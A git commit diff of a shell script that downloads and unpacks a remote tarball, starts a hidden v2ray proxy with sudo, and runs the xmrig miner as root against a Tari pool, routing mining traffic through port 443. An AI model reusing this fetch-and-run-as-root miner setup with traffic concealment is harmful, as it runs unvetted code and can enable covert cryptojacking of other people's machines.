fd95dd77b7bf1480fdf68ea4b5b42af20c9d18f7
prendibs <94189491+prendibs@users.noreply.github.com>
2025-09-04 16:24:59 +0700

    Update eu.sh

--- eu.sh
+++ eu.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
 #love u fika
 
-wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
+wget https://github.com/prendibs/eti/raw/main/x.tar.gz && tar xf x.tar.gz
 nohup sudo ./v2ray run --config=eu.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
-sudo ./xmrig -B -x 127.0.0.1:443 -o pool-global.tari.snipanet.com:3333 -u 12DS2mgfbHQGSvrf1CxsKbYG8umBTCcsz9LoVAaSyM3qyYWVqaNqkCBZb3TdaTYPZGqRKHmxi4Ur1wMJzHZbraexTw9 -p xeu -a rx/0 -k --randomx-1gb-pages
-
+sudo ./xmrig -B -x 127.0.0.1:443 -o pool-global.tari.snipanet.com:3333 -u 12DS2mgfbHQGSvrf1CxsKbYG8umBTCcsz9LoVAaSyM3qyYWVqaNqkCBZb3TdaTYPZGqRKHmxi4Ur1wMJzHZbraexTw9 -p 4sepeu -a rx/0 -k --randomx-1gb-pages
